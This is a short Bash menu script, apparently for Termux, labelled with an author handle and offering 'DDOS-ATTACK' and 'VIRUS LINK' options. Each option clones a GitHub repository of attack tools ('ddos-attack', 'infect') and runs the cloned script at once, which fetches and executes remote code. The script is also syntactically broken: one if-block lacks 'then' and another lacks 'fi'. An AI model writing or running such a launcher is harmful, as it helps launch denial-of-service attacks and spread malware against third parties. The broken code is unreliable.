

clear
echo "(+) AUTHOR : CYBER00 (+)"
echo "========================="
echo
sleep 1
echo "1.) DDOS-ATTACK"
echo "2.) VIRUS LINK"
echo "3.) KELUAR"
echo
read -p "masukan pilihan => " try

if [ $try = 1 ]
then
clear 
   pkg update && pkg upgrade -y
   pkg install python -y
   pkg install figlet -y
   pip install lolcat -y
   pkg install git -y
   git clone https://github.com/MrVirusSpm-07/ddos-attack
   cd ddos-attack
   python attack-ddos.py
fi

if [ $try = 2 ]
   pkg update && pkg upgrade -y
   pkg install python -y
   pkg install python2 -y
   pip install lolcat -y
   pkg install git -y
   git clone https://github.com/noob-hacker/infect
   cd infect
   bash infect.sh
fi

if [ $try = 3 ]
then
clear
   exit
   
   